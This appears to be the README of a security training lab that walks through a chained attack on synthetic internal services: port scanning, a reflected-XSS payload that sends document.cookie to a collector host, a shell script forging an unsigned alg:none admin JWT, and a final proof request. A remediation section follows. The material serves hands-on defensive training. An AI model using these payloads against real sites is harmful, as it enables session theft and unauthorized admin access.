# Lab 07 — Web Breach Chain: Recon to Root

A multi-skill capstone that chains an entire intrusion path against a synthetic
web estate: TCP connect scanning → HTTP surface mapping → a reflected-XSS
foothold → a JWT `alg:none` privilege escalation → a chained root proof.

Every host, token, and flag is synthetic and the lab network is internal-only
(`172.31.7.0/24`, no host ports published, no outbound access). The privilege
escalation is an **application-layer simulation** — the containers run
read-only, unprivileged, and with every Linux capability dropped, so there is
no real operating-system privilege to take. Use these techniques only against
the two lab services named below.

Targets:

- `edge-gateway` (`172.31.7.20`) — a raw TCP service beacon on `9091` and the
  vulnerable **ApertureOps** HTTP portal on `8080`.
- `ops-internal` (`172.31.7.30`) — an internal admin API on `8081` that trusts
  bearer tokens without verifying their signature.

## Before you start

New to these labs? Read the **[setup guide](../GETTING-STARTED.md)** first — it
covers installing Node.js and Docker, the two-terminal workflow, and how flags and
`verify` work.

Start the lab and open the toolbox (run from the project root):

```sh
node scripts/standalone-labctl.mjs start 07-web-breach-chain
node scripts/standalone-labctl.mjs shell 07-web-breach-chain
```

You are now **inside** the toolbox. Keep a **second terminal** open in the project
folder — that's where you submit each flag with `verify`.

Authorized scope: `172.31.7.0/24`. TCP connect scans only (`nmap -sT`) — the
toolbox has no raw-socket capability. No external targets.

## Walkthrough

Record the `objective_flag=RLAB{...}` value at each stage and submit it with
`verify` (from a second terminal). Objectives are gated in order.

### 1. Recon sweep

Map the segment, scan the edge host, and read its service beacon.

```sh
nmap -sT -p 1-10000 edge-gateway
nc -w 3 edge-gateway 9091 </dev/null      # APERTURE-EDGE beacon → recon_token + flag
node scripts/standalone-labctl.mjs verify 07-web-breach-chain recon-sweep 'RLAB{...}'
```

### 2. Surface map

Fingerprint the portal and discover the developer route it forgot to remove.

```sh
curl -I http://edge-gateway:8080/            # Server: ApertureOps/2.3
curl -s http://edge-gateway:8080/            # HTML comment hints at /api/dev/hello
curl -s http://edge-gateway:8080/robots.txt  # Disallow: /api/dev
curl -s http://edge-gateway:8080/api/dev/hello   # surface_token + flag
node scripts/standalone-labctl.mjs verify 07-web-breach-chain surface-map 'RLAB{...}'
```

### 3. Web foothold (reflected XSS)

`/support?msg=` reflects input without encoding. Submit a report whose script
reads `document.cookie`; the on-call analyst "opens" it in their session and
their session token leaks back to you.

```sh
curl -s 'http://edge-gateway:8080/support?msg=<b>xss</b>'   # confirm the sink reflects
curl -s -X POST \
  --data-urlencode 'report=<script>new Image().src="http://collector.lab/c?"+document.cookie</script>' \
  http://edge-gateway:8080/support/ticket        # stolen_cookie=session=<JWT> + foothold_token + flag
node scripts/standalone-labctl.mjs verify 07-web-breach-chain web-foothold 'RLAB{...}'
```

### 4. Privilege escalation (JWT alg:none)

Decode the stolen analyst JWT, preserve its `sid`, then forge a token with
`"alg":"none"`, `"role":"admin"`, and an empty signature to unlock the
internal admin console.

```sh
stolen='<JWT copied from stolen_cookie=session=...>'
encoded_payload=$(printf '%s' "$stolen" | cut -d. -f2)
case $((${#encoded_payload} % 4)) in
  2) encoded_payload="${encoded_payload}==" ;;
  3) encoded_payload="${encoded_payload}=" ;;
esac
sid=$(printf '%s' "$encoded_payload" | tr '_-' '/+' | base64 -d | jq -r .sid)
h=$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=\n' | tr '+/' '-_')
p=$(printf '{"sub":"analyst","role":"admin","sid":"%s"}' "$sid" | base64 | tr -d '=\n' | tr '+/' '-_')
forged="$h.$p."
curl -s -H "Authorization: Bearer $forged" http://ops-internal:8081/admin/console
# admin_token=root-obsidian-77 + flag
node scripts/standalone-labctl.mjs verify 07-web-breach-chain privilege-escalation 'RLAB{...}'
```

### 5. Root proof

Chain every recovered token and the forged bearer token into the final route.
It returns `401` without an authorized forged token and `403` until all four
stage tokens match.

```sh
curl -s -X POST \
  -H "Authorization: Bearer $forged" \
  --data-urlencode 'recon=beacon-argon-19' \
  --data-urlencode 'surface=surface-quartz-52' \
  --data-urlencode 'foothold=foothold-cinder-88' \
  --data-urlencode 'admin=root-obsidian-77' \
  http://ops-internal:8081/final              # final_proof + flag
node scripts/standalone-labctl.mjs verify 07-web-breach-chain root-proof 'RLAB{...}'
```

## Verify & reset

```sh
node scripts/standalone-labctl.mjs status 07-web-breach-chain
node scripts/standalone-labctl.mjs reset  07-web-breach-chain
node scripts/standalone-labctl.mjs stop   07-web-breach-chain
```

`smoke` (`node scripts/standalone-labctl.mjs smoke 07-web-breach-chain`) transiently
injects the expected flags to self-check the whole chain; it is a maintainer/CI
command, not part of the solution path.

## Detection / remediation

- **Reflected XSS:** contextually encode all user input on output; set a strict
  `Content-Security-Policy` and `HttpOnly` cookies so a script cannot read the
  session; treat report/preview features as untrusted rendering.
- **JWT `alg:none`:** pin the accepted algorithm server-side and reject `none`;
  always verify the signature with the expected key before trusting claims;
  derive authorization from server state, not client-supplied roles.
- **Network:** segment internal APIs so an edge foothold cannot reach them; log
  and alert on anomalous bearer tokens and on the recon burst that precedes them.
